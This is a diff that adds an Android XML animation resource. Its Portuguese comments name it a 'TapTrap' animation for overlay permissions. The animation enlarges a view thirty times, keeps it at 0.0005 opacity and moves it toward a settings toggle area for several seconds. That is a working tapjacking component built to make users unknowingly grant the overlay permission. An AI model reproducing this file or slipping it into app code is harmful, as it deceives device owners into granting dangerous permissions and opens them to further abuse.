@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- Animação TapTrap específica para permissões de overlay -->
+<set xmlns:android="http://schemas.android.com/apk/res/android">
+    <!-- Escalar para área de configurações de overlay -->
+    <scale
+        android:fromXScale="30"
+        android:toXScale="30"
+        android:fromYScale="30"
+        android:toYScale="30"
+        android:pivotX="70%"
+        android:pivotY="30%"
+        android:repeatCount="1"
+        android:duration="3800" />
+    <!-- Transparência mínima -->
+    <alpha
+        android:fromAlpha="0.0005"
+        android:toAlpha="0.0005"
+        android:repeatCount="1"
+        android:duration="3800" />
+    <!-- Movimento para área de toggle -->
+    <translate
+        android:fromXDelta="20%"
+        android:toXDelta="25%"
+        android:fromYDelta="10%"
+        android:toYDelta="15%"
+        android:duration="3800" />
+</set>
